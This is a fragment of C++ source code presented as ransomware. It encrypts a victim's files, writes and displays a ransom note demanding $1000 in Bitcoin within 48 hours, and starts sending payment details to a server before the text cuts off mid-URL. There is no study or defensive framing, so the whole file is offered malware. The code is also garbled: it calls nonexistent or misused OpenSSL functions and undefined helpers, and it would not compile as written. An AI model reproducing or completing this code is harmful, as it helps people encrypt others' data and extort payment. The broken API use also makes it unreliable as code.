#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <bitcoin/bitcoin.h>

using namespace std;

//Everything is set to default settings, change as you wish.

int main() {
    // Generate a random 256-bit key
    unsigned char key[32];
    for (int i = 0; i < 32; i++) {
        key[i] = rand() % 256;
    }

    // Generate a random IV (initialization vector)
    unsigned char iv[16];
    for (int i = 0; i < 16; i++) {
        iv[i] = rand() % 256;
    }

    // Encrypt the file
    vector<string> files = GetFilesToEncrypt();
    for (const auto& file : files) {
        AES_KEY aesKey;
        AES_set_decryptor(key, iv);
        AES_init_decrypt(&aesKey, key, iv);

        string encryptedFile = file + ".enc";
        ofstream encryptedFileStream(encryptedFile, ios::binary);
        ifstream originalFileStream(file, ios::binary);

        if (originalFileStream.is_open() && encryptedFileStream.is_open()) {
            byte buffer[1024];
            while (originalFileStream.read(buffer, sizeof(buffer))) {
                encryptedFileStream.write(AES_encrypt(buffer, &aesKey, AES_ENCRYPTION), sizeof(buffer));
            }

            originalFileStream.close();
            encryptedFileStream.close();
        } else {
            cout << "Failed to open or read file: " << file << endl;
        }
    }

    // Display ransom note
    string ransomNote = "Your files have been encrypted by Ransomware! To decrypt your files, you must pay $1000 worth of Bitcoin to the following address: " + GetBitcoinAddress();
    ofstream ransomNoteFile("ransom_note.txt", ios::binary);
    if (ransomNoteFile.is_open()) {
        ransomNoteFile.write(ransomNote.data(), ransomNote.size());
        ransomNoteFile.close();
    } else {
        cout << "Failed to write ransom note" << endl;
    }

    // Display ransom note on screen
    cout << "Your files have been encrypted by Ransomware! To decrypt your files, you must pay $1000 worth of Bitcoin to the following address: " << GetBitcoinAddress() << endl;
    cout << "Please send the payment within 48 hours to avoid losing your files permanently." << endl;
    cout << "Press any key to continue..." << endl;
    cin.get();

    // Get payment details
    string paymentAddress = GetBitcoinAddress();
    string paymentAmount = GetBitcoinAmount();

    // Send payment details to the server
    string paymentData = "payment_address=" + paymentAddress + "&payment_amount=" + paymentAmount;
    string url = "http://localhost:123
